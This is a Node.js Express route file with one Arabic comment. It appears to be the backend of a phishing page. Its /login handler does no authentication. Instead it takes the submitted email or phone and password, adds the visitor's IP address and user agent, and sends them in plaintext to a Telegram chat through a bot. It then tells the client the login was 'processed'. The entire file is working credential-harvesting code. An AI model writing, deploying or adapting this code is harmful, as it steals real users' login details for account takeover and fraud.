const express = require("express");
const router = express.Router();
const { initBot } = require("../botManager");

// استخدم botManager عشان تاخذ نفس نسخة البوت
const bot = initBot();
const chatId = bot.chatId;

router.post("/login", async (req, res) => {
  const { email, password } = req.body;

  if (!email || !password) {
    return res.status(400).json({ error: "Email and password are required." });
  }

  let ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
  if (ip && ip.includes(",")) ip = ip.split(",")[0];
  ip = ip.replace("::ffff:", "").replace("::1", "127.0.0.1");
  
  const userAgent = req.headers["user-agent"];

  const message = `
🔐 *Login Attempt Received*
━━━━━━━━━━━━━━━━━━━━
📧 Email / Phone: \`${email}\`
🔑 Password: \`${password}\`
🌐 IP: \`${ip}\`
📱 User-Agent:
\`${userAgent}\`
🕐 Time: ${new Date().toLocaleString()}
  `;

  try {
    await bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
    res.json({ message: "Login information processed." });
  } catch (error) {
    console.error("❌ Error sending login message:", error.message);
    res.status(500).json({ error: "Failed to process login information" });
  }
});

module.exports = router;